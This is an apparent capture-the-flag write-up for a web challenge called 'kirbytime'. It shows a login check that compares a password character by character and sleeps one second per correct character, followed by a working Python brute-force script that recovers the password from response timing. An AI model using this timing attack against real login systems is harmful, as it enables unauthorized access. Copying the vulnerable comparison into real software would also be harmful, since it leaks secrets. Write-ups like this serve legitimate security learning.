---
title: kirbytime
date: 2023-12-10T13:37:49+02:00
author: zacian
tags:
  - Web
draft: false
---

## Description

Welcome to Kirby's Website.

Author : `Stephanie`

## Solution

This challenge need us to start us a Docker Web Instance and also provide us with a zip attachment

Attachment : [kirbytime.zip](https://drive.google.com/uc?export=download&id=186KLr52yoTD1scFyzeZKSMa6cUr9iV6m&name=kirbytime.zip)

The site simply asks us for a password, after from that we couldn't find anything useful.

Now after downloading and unzipping the attachment, we can get the following logic from main.py

```py
        real = 'REDACTED'
        if len(password) != 7:
            return render_template('login.html', message="you need 7 chars")
        for i in range(len(password)):
            if password[i] != real[i]:
                message = "incorrect"
                return render_template('login.html', message=message)
            else:
                time.sleep(1)
        if password == real:
            message = "yayy! hi kirby"
```

So, for every valid password charecters it sleep for 1 sec. 

For this we can simply create a bruteforce script.

```py
import requests
import string
from time import sleep

chars    = string.ascii_letters + string.digits + string.punctuation
url      = "http://34.31.154.223:52249"
password = ['x'] * 7

try:
	for i in range(7):
		for c in chars:
			password[i]   = c
			send_password = ''.join(password)
			print("[+] Password :", send_password, end="\r")
			data = { "password" : send_password }
			try:
				response = requests.post(url, data=data)
				if response.elapsed.total_seconds() > i + 1: break
			except requests.exceptions.ConnectionError as e:
				if password[1] != 'x' :
					print("\n[!] Instance Closed")
				print("\n[!] Can not connect to the server")
				exit(0)
	print("[+] Password Found :", ''.join(password), end="\n")
except KeyboardInterrupt: print("\n[!] Bye")
```

This will find the password ... 

Note : If the instance stop before the bruteforce completes, do make some necessary changes to the range and replace the password with the one that you have